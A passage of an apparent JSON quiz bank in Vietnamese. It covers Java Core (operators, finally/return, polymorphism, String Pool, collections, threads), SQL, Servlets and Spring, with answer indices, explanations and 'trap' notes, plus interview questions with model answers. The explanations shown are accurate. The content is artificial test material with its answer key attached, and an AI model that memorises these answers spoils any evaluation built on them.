      "explanation": "1. Biểu thức `a++ > 5`: Toán tử postfix lấy giá trị hiện tại của `a` (là 5) để so sánh `5 > 5` -> kết quả là `false`. Sau đó `a` tăng lên 6.\n2. Vì vế trái của toán tử short-circuit `&&` là `false`, JVM lập tức dừng và không chạy vế phải `(++b > 10)`!\n3. Do đó, `b` vẫn giữ nguyên giá trị 10, không bị tăng. Biến `result` là `false`.\n-> In ra: `a = 6, b = 10, result = false`.",
      "trap": "Rất nhiều người nhầm tưởng `++b` vẫn được thực thi và cho ra `b = 11`."
    },
    {
      "id": "q3",
      "chapter": "Chapter 4: Flow Control & Exceptions",
      "type": "Java Core",
      "question": "Giá trị trả về của phương thức `calculate()` dưới đây là bao nhiêu?",
      "code": "public class Test3 {\n    public static int calculate() {\n        int x = 10;\n        try {\n            x += 5;\n            return x;\n        } catch (Exception e) {\n            x += 10;\n            return x;\n        } finally {\n            x += 20;\n            return x;\n        }\n    }\n    public static void main(String[] args) {\n        System.out.println(calculate());\n    }\n}",
      "options": [
        "15",
        "25",
        "35",
        "Lỗi biên dịch vì có nhiều lệnh return"
      ],
      "correctIndex": 2,
      "explanation": "Trong khối `try`, `x` được cộng 5 thành 15, và chuẩn bị `return 15`. Tuy nhiên, trước khi thoát khỏi phương thức, khối `finally` BẮT BUỘC phải thực thi. Trong `finally`, `x` được cộng thêm 20 (thành 35), và lệnh `return x` trong `finally` được thực thi, hoàn toàn GHI ĐÈ lệnh return trước đó của `try`. Kết quả trả về là 35.",
      "trap": "Lệnh `return` trong khối `finally` luôn nuốt chửng kết quả return hoặc exception phát sinh từ khối `try` hoặc `catch`."
    },
    {
      "id": "q4",
      "chapter": "Chapter 5: Object Orientation",
      "type": "Java Core",
      "question": "Cho hai class sau. Kết quả khi chạy chương trình là gì?",
      "code": "class Animal {\n    String name = \"Animal\";\n    void makeSound() {\n        System.out.println(\"Animal sound\");\n    }\n}\nclass Dog extends Animal {\n    String name = \"Dog\";\n    void makeSound() {\n        System.out.println(\"Bark\");\n    }\n}\npublic class Test4 {\n    public static void main(String[] args) {\n        Animal a = new Dog();\n        System.out.print(a.name + \" - \");\n        a.makeSound();\n    }\n}",
      "options": [
        "Dog - Bark",
        "Animal - Bark",
        "Animal - Animal sound",
        "Lỗi biên dịch (Compile Error)"
      ],
      "correctIndex": 1,
      "explanation": "- Thuộc tính (fields) trong Java KHÔNG có tính đa hình (Polymorphism) mà bị che khuất (Shadowing). Việc truy cập `a.name` phụ thuộc vào kiểu của biến tham chiếu lúc biên dịch (`Animal`), do đó `a.name` lấy giá trị 'Animal'.\n- Ngược lại, phương thức (methods) CÓ tính đa hình lúc thực thi (Dynamic Method Dispatch). Đối tượng thực tế là `Dog` nên `a.makeSound()` gọi phương thức của `Dog` và in ra 'Bark'.\n-> Kết quả in ra: `Animal - Bark`.",
      "trap": "Bẫy kinh điển: Thuộc tính không đa hình, chỉ có instance method mới đa hình!"
    },
    {
      "id": "q5",
      "chapter": "Chapter 6: String, Wrapper & Math",
      "type": "Java Core",
      "question": "Đoạn mã sau sẽ in ra kết quả gì?",
      "code": "public class Test5 {\n    public static void main(String[] args) {\n        String s1 = \"Java\";\n        String s2 = new String(\"Java\");\n        String s3 = \"Ja\" + \"va\";\n        \n        System.out.print((s1 == s2) + \" \");\n        System.out.print((s1 == s3) + \" \");\n        System.out.print(s1.equals(s2));\n    }\n}",
      "options": [
        "true true true",
        "false true true",
        "false false true",
        "false true false"
      ],
      "correctIndex": 1,
      "explanation": "1. `s1 == s2`: `s1` trỏ đến đối tượng trong String Pool, `s2` dùng từ khóa `new` nên trỏ đến đối tượng mới trên Heap -> Khác địa chỉ tham chiếu -> `false`.\n2. `s1 == s3`: Biểu thức `\"Ja\" + \"va\"` là hằng số chuỗi (compile-time constant expression), compiler tự động tối ưu ghép thành `\"Java\"` tại thời điểm biên dịch và lấy từ String Pool -> Cùng tham chiếu với `s1` -> `true`.\n3. `s1.equals(s2)`: So sánh nội dung ký tự, cả hai đều là 'Java' -> `true`.\n-> In ra: `false true true`.",
      "trap": "Cần phân biệt nối hai hằng số literal (tối ưu lúc compile) với nối biến (`s + \"va\"` sẽ tạo object mới lúc runtime)."
    },
    {
      "id": "q6",
      "chapter": "Chapter 7: Collections Framework",
      "type": "Java Core",
      "question": "Điều gì xảy ra khi thêm các phần tử vào TreeSet như sau?",
      "code": "import java.util.*;\nclass Student {\n    int id;\n    Student(int id) { this.id = id; }\n}\npublic class Test6 {\n    public static void main(String[] args) {\n        Set<Student> set = new TreeSet<>();\n        set.add(new Student(1));\n        set.add(new Student(2));\n        System.out.println(set.size());\n    }\n}",
      "options": [
        "In ra: 2",
        "In ra: 1",
        "Lỗi biên dịch (Compile Error)",
        "Ném ngoại lệ ClassCastException lúc chạy (Runtime Exception)"
      ],
      "correctIndex": 3,
      "explanation": "`TreeSet` là tập hợp có sắp xếp (SortedSet). Khi thêm một phần tử vào `TreeSet` mà không truyền vào một `Comparator`, các phần tử bắt buộc phải implement interface `Comparable`. Class `Student` không implement `Comparable`, do đó phương thức `add()` sẽ cố gắng ép kiểu sang `Comparable` và ném ra ngoại lệ `java.lang.ClassCastException` tại runtime.",
      "trap": "Mã biên dịch hoàn toàn bình thường vì tính kiểm tra generic không bắt lỗi Comparable lúc compile."
    },
    {
      "id": "q7",
      "chapter": "Chapter 9: Threads",
      "type": "Java Core",
      "question": "Xét đoạn mã sau. Thứ tự các dòng chữ được in ra chắc chắn là gì?",
      "code": "public class Test7 {\n    public static void main(String[] args) {\n        Thread t = new Thread() {\n            public void run() {\n                System.out.print(\"A \");\n            }\n        };\n        t.run();\n        System.out.print(\"B \");\n    }\n}",
      "options": [
        "Luôn luôn in ra: A B",
        "Có thể in ra A B hoặc B A tùy thuộc vào Thread Scheduler",
        "Luôn luôn in ra: B A",
        "Lỗi biên dịch"
      ],
      "correctIndex": 0,
      "explanation": "Lưu ý phương thức được gọi là `t.run()` chứ KHÔNG PHẢI `t.start()`!\nGọi `t.run()` chỉ đơn thuần là một lời gọi hàm thông thường trên chính luồng hiện tại (`main` thread). Chương trình chạy tuần tự: in ra `A ` xong mới chạy dòng tiếp theo in ra `B `.\n-> Kết quả CHẮC CHẮN luôn là: `A B`.",
      "trap": "Nếu gọi `t.start()`, luồng mới được tạo và thứ tự `A B` hay `B A` mới không thể đoán trước."
    },
    {
      "id": "q8",
      "chapter": "SQL Queries & Relational DB",
      "type": "Database & SQL",
      "question": "Cho bảng `Employees (id, name, department_id, salary)`. Câu lệnh nào tính mức lương trung bình của từng phòng ban có từ 3 nhân viên trở lên?",
      "code": "-- Chọn câu lệnh đúng cú pháp SQL chuẩn:",
      "options": [
        "SELECT department_id, AVG(salary) FROM Employees WHERE COUNT(*) >= 3 GROUP BY department_id;",
        "SELECT department_id, AVG(salary) FROM Employees GROUP BY department_id HAVING COUNT(*) >= 3;",
        "SELECT department_id, AVG(salary) FROM Employees GROUP BY department_id WHERE COUNT(*) >= 3;",
        "SELECT department_id, AVG(salary) FROM Employees HAVING COUNT(*) >= 3;"
      ],
      "correctIndex": 1,
      "explanation": "Mệnh đề `HAVING` dùng để lọc kết quả sau khi đã gom nhóm bằng `GROUP BY`, và có thể áp dụng các hàm tổng hợp như `COUNT(*)`. Mệnh đề `WHERE` chỉ lọc từng dòng trước khi gom nhóm và không thể chứa `COUNT(*)`. Thứ tự các mệnh đề chuẩn là: `FROM -> WHERE -> GROUP BY -> HAVING -> SELECT -> ORDER BY`.",
      "trap": "Viết điều kiện hàm tổng hợp trong `WHERE` là lỗi cú pháp SQL kinh điển."
    },
    {
      "id": "q9",
      "chapter": "JavaWeb: JSP & Servlet",
      "type": "JavaWeb",
      "question": "Trong Servlet, nếu muốn chuyển tiếp dữ liệu đến một trang JSP và giữ nguyên các thuộc tính (attributes) đã lưu trong đối tượng `request`, ta nên dùng phương thức nào?",
      "code": "// Cách nào giữ nguyên request attributes?",
      "options": [
        "response.sendRedirect(\"view.jsp\");",
        "request.getRequestDispatcher(\"view.jsp\").forward(request, response);",
        "response.setHeader(\"Location\", \"view.jsp\");",
        "request.sendForward(\"view.jsp\");"
      ],
      "correctIndex": 1,
      "explanation": "Phương thức `RequestDispatcher.forward()` thực hiện chuyển tiếp xử lý hoàn toàn ở phía server trong cùng một luồng request. Trình duyệt không hề biết về việc chuyển tiếp này, do đó đối tượng `request` được giữ nguyên vẹn cùng toàn bộ attributes đã set bằng `request.setAttribute()`. Ngược lại, `sendRedirect` sẽ bắt trình duyệt tạo một request mới tinh làm mất sạch dữ liệu request cũ.",
      "trap": "`sendRedirect` làm mất dữ liệu request attributes."
    },
    {
      "id": "q10",
      "chapter": "Spring Framework",
      "type": "Spring",
      "question": "Annotation nào trong Spring Framework kết hợp cả hai annotation `@Controller` và `@ResponseBody`?",
      "code": "@Target(ElementType.TYPE)\n@Retention(RetentionPolicy.RUNTIME)\n// Annotation nào?",
      "options": [
        "@Service",
        "@Repository",
        "@RestController",
        "@WebController"
      ],
      "correctIndex": 2,
      "explanation": "`@RestController` là một convenience annotation trong Spring MVC, nó tương đương với việc khai báo `@Controller` trên class và gắn `@ResponseBody` lên tất cả các phương thức xử lý request. Dữ liệu trả về từ các method sẽ được tự động chuyển đổi (serialize) thành định dạng JSON hoặc XML thay vì trả về tên trang view HTML/JSP.",
      "trap": "Nếu dùng `@Controller` thông thường mà muốn trả về JSON, bạn bắt buộc phải gắn thêm `@ResponseBody` trên phương thức."
    },
    {
      "id": "q11",
      "chapter": "Chapter 2: Declarations & Access Control",
      "type": "Java Core",
      "question": "Trong một interface, khai báo nào sau đây là KHÔNG hợp lệ và gây lỗi biên dịch (Java 7 trở về trước)?",
      "code": "public interface Action {\n    // Khai báo nào gây lỗi?\n}",
      "options": [
        "int TIMEOUT = 100;",
        "public void execute();",
        "protected void run();",
        "void perform() throws Exception;"
      ],
      "correctIndex": 2,
      "explanation": "Trong interface, tất cả các phương thức đều ngầm định là `public abstract`. Không thể khai báo phương thức với modifier `protected` hoặc `private`. Khai báo `protected void run();` sẽ gây ra Compile Error: Illegal modifier for the interface method; only public & abstract are permitted.",
      "trap": "Trong class bình thường thì `protected` rất phổ biến, nhưng interface tuyệt đối không cho phép `protected`."
    },
    {
      "id": "q12",
      "chapter": "Chapter 3: Operators & Assignments",
      "type": "Java Core",
      "question": "Kết quả in ra của đoạn mã sau là gì?",
      "code": "public class ShiftTest {\n    public static void main(String[] args) {\n        int x = -1;\n        System.out.println(x >>> 31);\n    }\n}",
      "options": [
        "-1",
        "1",
        "0",
        "Lỗi biên dịch"
      ],
      "correctIndex": 1,
      "explanation": "Trong Java, toán tử `>>>` là toán tử dịch phải không dấu (Unsigned Right Shift). Số -1 trong biểu diễn nhị phân 32-bit là 32 bit 1 (0xFFFFFFFF). Khi dịch phải không dấu 31 bit, 31 bit 0 sẽ được chèn vào bên trái, chỉ còn lại bit 1 ở hàng đơn vị cùng, cho ra kết quả là 1.",
      "trap": "Nhầm lẫn giữa `>>` (signed shift giữ nguyên bit dấu) và `>>>` (unsigned shift luôn chèn 0 vào bên trái)."
    },
    {
      "id": "q13",
      "chapter": "Chapter 4: Flow Control",
      "type": "Java Core",
      "question": "Kết quả in ra của đoạn mã switch dưới đây là gì?",
      "code": "public class SwitchTrap {\n    public static void main(String[] args) {\n        int num = 2;\n        switch (num) {\n            case 1: System.out.print(\"1 \");\n            case 2: System.out.print(\"2 \");\n            case 3: System.out.print(\"3 \");\n            default: System.out.print(\"D \");\n            case 4: System.out.print(\"4 \");\n        }\n    }\n}",
      "options": [
        "2 ",
        "2 3 D 4 ",
        "2 3 D ",
        "2 3 "
      ],
      "correctIndex": 1,
      "explanation": "Đây là hiện tượng Fall-Through trong `switch`. Khi `num == 2`, chương trình khớp tại `case 2` và in `2 `. Do KHÔNG có câu lệnh `break`, chương trình tiếp tục rơi xuống và thực thi tất cả các case bên dưới bất kể điều kiện, bao gồm cả `case 3`, `default`, và `case 4`.\n-> Kết quả: 2 3 D 4 .",
      "trap": "Quên `break` trong switch là bẫy câu hỏi trắc nghiệm phổ biến nhất về Flow Control."
    },
    {
      "id": "q14",
      "chapter": "Chapter 5: Object Orientation",
      "type": "Java Core",
      "question": "Đoạn mã sau có biên dịch thành công không? Nếu có thì in ra gì?",
      "code": "class Base {\n    Base() {\n        System.out.print(\"Base \");\n    }\n}\nclass Sub extends Base {\n    Sub() {\n        this(\"Hi \");\n        System.out.print(\"Sub1 \");\n    }\n    Sub(String s) {\n        System.out.print(s);\n    }\n}\npublic class TestConstructors {\n    public static void main(String[] args) {\n        new Sub();\n    }\n}",
      "options": [
        "Base Hi Sub1 ",
        "Hi Sub1 Base ",
        "Hi Base Sub1 ",
        "Lỗi biên dịch vì this() và super() xung đột"
      ],
      "correctIndex": 0,
      "explanation": "Khi `new Sub()` được gọi:\n1. Constructor `Sub()` gọi `this(\"Hi \")`.\n2. Constructor `Sub(String s)` không gọi constructor nào khác nên compiler tự động chèn `super()` ở dòng đầu tiên.\n3. `super()` gọi constructor của `Base()`, in ra: `Base `.\n4. Sau khi `Base()` hoàn thành, thân của `Sub(String s)` chạy, in ra: `Hi `.\n5. Cuối cùng, thân của `Sub()` tiếp tục chạy, in ra: `Sub1 `.\n-> Thứ tự in ra: Base Hi Sub1 .",
      "trap": "Luôn nhớ: Constructor cha (`super()`) phải hoàn thành khởi tạo trước khi thân constructor con được chạy."
    },
    {
      "id": "q15",
      "chapter": "Chapter 5: Object Orientation",
      "type": "Java Core",
      "question": "Điều gì xảy ra khi gọi phương thức `static` thông qua đối tượng cha được gán đối tượng con?",
      "code": "class Parent {\n    public static void print() { System.out.print(\"P \"); }\n}\nclass Child extends Parent {\n    public static void print() { System.out.print(\"C \"); }\n}\npublic class StaticHide {\n    public static void main(String[] args) {\n        Parent p = new Child();\n        p.print();\n        Child c = new Child();\n        c.print();\n    }\n}",
      "options": [
        "C C ",
        "P C ",
        "P P ",
        "Lỗi biên dịch vì phương thức static không thể override"
      ],
      "correctIndex": 1,
      "explanation": "Trong Java, phương thức `static` KHÔNG thể bị override (ghi đè), mà chỉ bị HIDING (che khuất). Việc gọi một static method thông qua biến tham chiếu sẽ được compiler dịch dựa theo KIỂU CỦA THAM CHIẾU lúc biên dịch (Compile-time type) chứ không theo đối tượng thực tế lúc runtime.\n- `p` có kiểu tham chiếu là `Parent` -> `p.print()` gọi `Parent.print()` -> in ra P .\n- `c` có kiểu tham chiếu là `Child` -> `c.print()` gọi `Child.print()` -> in ra C .\n-> Kết quả: P C .",
      "trap": "Static methods không có tính đa hình (Dynamic Binding). JVM gọi trực tiếp theo kiểu tham chiếu."
    },
    {
      "id": "q16",
      "chapter": "Chapter 7: Collections Framework",
      "type": "Java Core",
      "question": "Phát biểu nào sau đây là ĐÚNG khi nói về giá trị `null` trong `HashMap` và `Hashtable`?",
      "code": "// So sánh HashMap vs Hashtable với null:",
      "options": [
        "Cả HashMap và Hashtable đều cho phép 1 key null và nhiều value null.",
        "HashMap cho phép 1 key null và nhiều value null; Hashtable KHÔNG cho phép bất kỳ key hoặc value null nào.",
        "Hashtable cho phép key null nhưng không cho phép value null.",
        "Cả hai đều ném NullPointerException nếu truyền key null."
      ],
      "correctIndex": 1,
      "explanation": "Đặc điểm quan trọng:\n- `HashMap` cho phép lưu DUY NHẤT 1 `null` key (nằm ở bucket 0) và vô số `null` values.\n- `Hashtable` là collection đồng bộ cũ từ Java 1.0, nó KHÔNG CHO PHÉP bất kỳ `null` key nào (gọi `key.hashCode()` gây NPE) và cũng KHÔNG CHO PHÉP `null` value nào. Nếu đưa null vào Hashtable sẽ lập tức ném `NullPointerException`.",
      "trap": "Câu hỏi so sánh cực kỳ hay gặp trong các đề thi tuyển fresher và SCJP."
    },
    {
      "id": "q17",
      "chapter": "Chapter 9: Threads",
      "type": "Java Core",
      "question": "Khác biệt căn bản giữa `Thread.sleep(ms)` và `object.wait(ms)` là gì?",
      "code": "// Điểm khác nhau về giữ khóa (Lock / Monitor)?",
      "options": [
        "`sleep()` giải phóng khóa (releases lock), `wait()` giữ nguyên khóa (holds lock).",
        "`wait()` giải phóng khóa (releases lock) để thread khác có thể vào synchronized block, `sleep()` GIỮ NGUYÊN KHÓA (holds lock).",
        "Cả hai phương thức đều giải phóng khóa.",
        "Cả hai phương thức đều không giải phóng khóa."
      ],
      "correctIndex": 1,
      "explanation": "Quy tắc vàng trong Multi-threading:\n- `Thread.sleep()` tạm dừng luồng hiện tại nhưng VẪN TIẾP TỤC GIỮ KHÓA (Monitor Lock). Không thread nào khác có thể vào khối synchronized mà luồng này đang nắm giữ.\n- `object.wait()` TẠM GIẢI PHÓNG KHÓA (releases the lock) của đối tượng đó và chuyển luồng vào trạng thái chờ cho đến khi được đánh thức bởi `notify()` hoặc `notifyAll()`.",
      "trap": "Nhớ câu thần chú: Wait releases the lock, Sleep holds the lock."
    },
    {
      "id": "q18",
      "chapter": "SQL Queries & Relational DB",
      "type": "Database & SQL",
      "question": "Cho bảng `Products` có 5 dòng, trong đó cột `price` có các giá trị: `10, 20, NULL, 30, NULL`. Kết quả của `SELECT COUNT(*), COUNT(price) FROM Products;` là:",
      "code": "SELECT COUNT(*), COUNT(price) FROM Products;",
      "options": [
        "5, 5",
        "5, 3",
        "3, 3",
        "5, 0"
      ],
      "correctIndex": 1,
      "explanation": "- `COUNT(*)`: Đếm TẤT CẢ các dòng dữ liệu trong bảng, bất kể cột nào có chứa giá trị NULL hay không -> Trả về 5.\n- `COUNT(column_name)`: CHỈ đếm các dòng mà cột đó CÓ GIÁ TRỊ (bỏ qua/không tính các dòng mang giá trị NULL) -> Cột price có 3 giá trị khác NULL -> Trả về 3.\n-> Kết quả: 5, 3.",
      "trap": "Nhiều người nghĩ `COUNT(column)` cũng đếm toàn bộ dòng như `COUNT(*)`. Cột NULL luôn bị bỏ qua trong các hàm tổng hợp như COUNT, SUM, AVG."
    },
    {
      "id": "q19",
      "chapter": "SQL Queries & Relational DB",
      "type": "Database & SQL",
      "question": "Câu lệnh truy vấn nào sau đây dùng để tìm tất cả khách hàng (Customers) CHƯA TỪNG đặt bất kỳ đơn hàng nào (Orders)?",
      "code": "-- Khách hàng chưa từng có đơn hàng nào:",
      "options": [
        "SELECT c.* FROM Customers c INNER JOIN Orders o ON c.id = o.customer_id WHERE o.id IS NULL;",
        "SELECT c.* FROM Customers c LEFT JOIN Orders o ON c.id = o.customer_id WHERE o.id IS NULL;",
        "SELECT c.* FROM Customers c RIGHT JOIN Orders o ON c.id = o.customer_id WHERE c.id IS NULL;",
        "SELECT c.* FROM Customers c WHERE c.id IN (SELECT customer_id FROM Orders);"
      ],
      "correctIndex": 1,
      "explanation": "Dùng `LEFT JOIN` để lấy toàn bộ danh sách khách hàng. Với những khách hàng chưa có đơn hàng nào, các cột của bảng `Orders` sẽ mang giá trị NULL. Kết hợp điều kiện `WHERE o.id IS NULL` sẽ lọc ra chính xác các khách hàng không có đơn hàng.",
      "trap": "Dùng `INNER JOIN` sẽ loại bỏ sạch khách hàng chưa có đơn ngay từ bước kết nối bảng."
    },
    {
      "id": "q20",
      "chapter": "Spring Framework",
      "type": "Spring",
      "question": "Scope mặc định của một Bean trong Spring Container là gì? Điều đó có nghĩa là gì?",
      "code": "@Component\npublic class MyService {}\n// Scope mặc định là gì?",
      "options": [
        "prototype (mỗi lần yêu cầu tạo một instance mới)",
        "singleton (chỉ có duy nhất 1 instance được tạo và dùng chung trong toàn bộ Spring Container)",
        "request (tạo mới mỗi HTTP request)",
        "session (tạo mới mỗi HTTP session)"
      ],
      "correctIndex": 1,
      "explanation": "Trong Spring Framework, Scope mặc định của mọi Bean là singleton. Spring IoC Container chỉ khởi tạo duy nhất một thực thể (instance) của bean đó và lưu trong bộ đệm (cache), tất cả các nơi tiêm phụ thuộc (@Autowired) hoặc gọi `getBean()` đều nhận về cùng một đối tượng duy nhất này.",
      "trap": "Nếu bean có trạng thái (stateful - chứa thuộc tính thay đổi theo từng request/user), dùng singleton có thể gây ra race-condition giữa các thread."
    }
  ],
  "auditQuestions": [
    {
      "id": "audit_1",
      "domain": "Java Core",
      "question": "Phân biệt toán tử == và phương thức .equals() trong Java? Giải thích cơ chế String Constant Pool?",
      "timeLimitSeconds": 90,
      "keyPoints": [
        "== so sánh địa chỉ ô nhớ (reference identity) đối với Object, so sánh giá trị nhị phân đối với primitive types.",
        ".equals() mặc định trong class Object dùng ==, nhưng các lớp con (String, Integer, Date...) override để so sánh giá trị logic.",
        "String Constant Pool là vùng nhớ đặc biệt trong Heap lưu trữ chuỗi literal nhằm tái sử dụng bộ nhớ.",
        "String s1 = 'abc'; s2 = 'abc' -> s1 == s2 (true). Nhưng s3 = new String('abc') luôn tạo object mới trên Heap -> s1 == s3 (false)."
      ],
      "modelAnswer": "Trong Java:\n1. **Toán tử `==`**: Dùng để so sánh giá trị nhị phân trực tiếp. Với primitive types (int, double, boolean...), nó so sánh giá trị. Với đối tượng (Object), nó so sánh **địa chỉ ô nhớ** (hai biến có cùng trỏ tới 1 vùng nhớ trên Heap hay không).\n2. **Phương thức `.equals()`**: Mặc định trong class `Object`, nó vẫn dùng `==`. Tuy nhiên, các lớp như `String`, `Integer`, `Date` đã override lại để **so sánh bình đẳng về mặt nội dung logic**.\n3. **Cơ chế String Constant Pool**: Khi tạo chuỗi dạng literal `String s1 = \"hello\";`, JVM sẽ tìm trong Pool xem đã có chuỗi \"hello\" chưa. Nếu có rồi, nó trả về tham chiếu đến chuỗi đó mà không cấp phát thêm. Nếu viết `String s2 = new String(\"hello\");`, JVM bắt buộc tạo đối tượng mới độc lập trên Heap, dù nội dung giống nhau. Do đó `s1 == s2` là `false`, nhưng `s1.equals(s2)` là `true`. Phương thức `s2.intern()` sẽ đưa tham chiếu về chuỗi trong Pool.",
      "seniorTip": "Hãy vẽ mô hình Stack/Heap nhanh trong đầu khi giải thích, và chủ động nhắc đến phương thức .intern() để ghi điểm chuyên sâu."
    },
    {
      "id": "audit_2",
      "domain": "Java Core",
      "question": "Phân biệt Overloading và Overriding? Nêu 4 quy tắc bắt buộc khi Override phương thức trong quan hệ kế thừa?",
      "timeLimitSeconds": 90,
      "keyPoints": [
        "Overloading (Nạp chồng): Cùng class, cùng tên, KHÁC tham số (số lượng, kiểu, thứ tự). Xảy ra tại Compile-time (Static polymorphism).",
        "Overriding (Ghi đè): Quan hệ cha-con, cùng tên, CÙNG tham số. Xảy ra tại Runtime (Dynamic polymorphism).",
        "4 quy tắc Override: (1) Cùng chữ ký; (2) Access modifier không được hẹp hơn; (3) Return type phải giống hoặc covariant; (4) Không throw checked exception mới/rộng hơn.",
        "Không thể override static method (đây là Method Hiding)."
      ],
      "modelAnswer": "Khác biệt cốt lõi:\n- **Overloading**: Xảy ra trong cùng một class. Các method cùng tên nhưng BẮT BUỘC khác nhau về danh sách tham số (số lượng, kiểu dữ liệu hoặc thứ tự). Kiểu trả về và access modifier có thể tùy ý. Quyết định gọi method nào được giải quyết tại Compile-time.\n- **Overriding**: Xảy ra giữa class cha và con (kế thừa/interface). Class con viết lại hiện thực của method cha để tùy biến hành vi. Quyết định gọi method nào dựa trên kiểu đối tượng thực tế tại Runtime.\n\n**4 Quy Tắc Vàng Khi Override**:\n1. **Tên và tham số**: Phải giống hệt method cha (Signature identical).\n2. **Phạm vi truy cập (Access Modifier)**: Con **KHÔNG ĐƯỢC hẹp hơn** cha. (Ví dụ: cha là `protected` thì con phải là `protected` hoặc `public`, không được là `private` hay `default`).\n3. **Kiểu trả về (Return Type)**: Phải cùng kiểu hoặc là **Covariant Return Type** (tức là kiểu con của kiểu trả về ở cha, hỗ trợ từ Java 5).\n4. **Ngoại lệ (Checked Exception)**: Con **KHÔNG ĐƯỢC** ném ngoại lệ Checked mới hoặc rộng hơn cha (có thể không throw, hoặc chỉ throw ngoại lệ con/hẹp hơn).",
      "seniorTip": "Đừng quên nhắc rằng static method không override được mà là Method Hiding, và private method không thể override vì con không nhìn thấy."
    },
    {
      "id": "audit_3",
      "domain": "Java Core",
      "question": "HashMap hoạt động như thế nào bên dưới bộ nhớ? Tại sao bắt buộc phải override đồng thời equals() và hashCode()?",
      "timeLimitSeconds": 90,
      "keyPoints": [
        "HashMap dựa trên bảng băm (Hash Table) gồm mảng các Node/Bucket.",
        "put(K, V): Tính hash(key) -> index trong mảng. Nếu rỗng lưu Node. Nếu va chạm (collision), lưu vào LinkedList hoặc chuyển thành Red-Black Tree (khi bucket >= 8 từ Java 8).",
        "Hợp đồng equals & hashCode: Nếu a.equals(b) == true thì BẮT BUỘC a.hashCode() == b.hashCode().",
        "Nếu quên hashCode: 2 object bằng nhau có thể sinh 2 hash khác nhau, rơi vào 2 bucket khác nhau -> get() sẽ trả về null dù object đã put!"
      ],
      "modelAnswer": "Cơ chế hoạt động của HashMap:\n1. **Cấu trúc dữ liệu**: HashMap quản lý một mảng các Bucket (`Node<K,V>[]`). Mỗi Node gồm `hash, key, value, next`.\n2. **Khi gọi `put(key, value)`**:\n   - JVM gọi `key.hashCode()` rồi qua hàm băm nội bộ tính chỉ số `index = (n - 1) & hash`.\n   - Nếu bucket tại index đó đang trống, Node mới được gắn vào.\n   - Nếu đã có phần tử (xảy ra **Hash Collision**), HashMap duyệt danh sách liên kết tại bucket đó. Nó dùng `equals()` để so sánh key: nếu trùng key thì ghi đè value mới; nếu chưa có thì thêm vào cuối (từ Java 8, nếu bucket dài >= 8 và mảng >= 64, nó tự động chuyển từ LinkedList sang **Red-Black Tree** để giữ tốc độ tìm kiếm $O(\\log N)$ thay vì $O(N)$).\n3. **Hợp đồng equals & hashCode**:\n   - Theo Java Specification: **Nếu `a.equals(b) == true` thì `a.hashCode()` PHẢI BẰNG `b.hashCode()`**.\n   - Nếu chỉ override `equals()` mà quên `hashCode()`, hai đối tượng có nội dung giống hệt nhau sẽ có hai mã hash khác nhau. Khi gọi `get()`, HashMap tính ra bucket khác và trả về `null`!",
      "seniorTip": "Nhắc tới Load Factor mặc định (0.75) và cơ chế Resize (gấp đôi kích thước khi đạt 75% dung lượng) sẽ thể hiện bạn hiểu sâu về Performance."
    },
    {
      "id": "audit_4",
      "domain": "Java Core",
      "question": "Abstract Class khác gì Interface? Trong thiết kế phần mềm thực tế, khi nào nên dùng Abstract Class, khi nào nên dùng Interface?",
      "timeLimitSeconds": 90,
      "keyPoints": [
        "Interface: Đại diện cho hợp đồng hành vi ('CAN-DO'), hỗ trợ đa kế thừa (implements nhiều interface).",
        "Abstract Class: Đại diện cho mối quan hệ bản chất ('IS-A'), chỉ hỗ trợ đơn kế thừa (extends 1 class).",
        "State & Constructor: Abstract Class có constructor, có instance variable có trạng thái; Interface (trước Java 8) chỉ có hằng số public static final.",
        "Từ Java 8, Interface có default method và static method; Java 9 có private method."
      ],
      "modelAnswer": "So sánh Abstract Class và Interface:\n1. **Về bản chất quan hệ**:\n   - **Abstract Class** thể hiện quan hệ kế thừa huyết thống cốt lõi: **\"IS-A\"** (Chó là Động vật). Dùng khi các lớp con có chung bản chất và cần chia sẻ mã nguồn, trạng thái (state).\n   - **Interface** thể hiện năng lực hoặc hợp đồng hành vi: **\"CAN-DO\"** (Máy bay có thể bay, Chim có thể bay). Các class hoàn toàn không liên quan nhau vẫn có thể implement chung một Interface (ví dụ `Comparable`, `Serializable`).\n2. **Về cấu trúc ngôn ngữ**:\n   - Một class chỉ có thể kế thừa **1 Abstract Class** (đơn kế thừa), nhưng có thể implement **nhiều Interface** (đa kế thừa kiểu).\n   - Abstract Class có thể có constructor, có biến instance (state) với mọi access modifier (`private`, `protected`).\n   - Interface không có constructor. Biến trong interface mặc định luôn là `public static final`. Từ Java 8, interface bổ sung `default method` và `static method`.\n3. **Khi nào dùng gì?**\n   - Dùng **Interface** khi muốn định nghĩa bộ tiêu chuẩn chung, decoupling tầng kiến trúc (Controller phụ thuộc Service Interface).\n   - Dùng **Abstract Class** khi xây dựng khung xương cơ bản (Template Method Pattern) có các hàm dùng chung đã hoàn chỉnh và các hàm con tự viết thêm.",
      "seniorTip": "Nêu nguyên lý 'Program to an interface, not an implementation' trong thiết kế OOP để khẳng định tư duy kiến trúc."
    },
    {
      "id": "audit_5",
      "domain": "Java Core",
      "question": "Phân biệt bộ nhớ Stack và Heap trong JVM? Cơ chế truyền tham số trong Java là Pass-by-value hay Pass-by-reference?",
      "timeLimitSeconds": 90,
      "keyPoints": [
        "Stack: Lưu trữ lời gọi hàm (Stack Frame), biến cục bộ nguyên thủy và biến tham chiếu. Tự động giải phóng khi method kết thúc. Quá tải gây StackOverflowError.",
        "Heap: Lưu trữ toàn bộ đối tượng (Object) và mảng. Được dọn dẹp bởi Garbage Collector. Quá tải gây OutOfMemoryError.",
        "Java 100% là PASS-BY-VALUE (Truyền theo giá trị).",
        "Khi truyền đối tượng, giá trị được copy chính là ĐỊA CHỈ THAM CHIẾU (copy of reference). Gán obj = new Object() bên trong method không làm đổi biến bên ngoài."
      ],
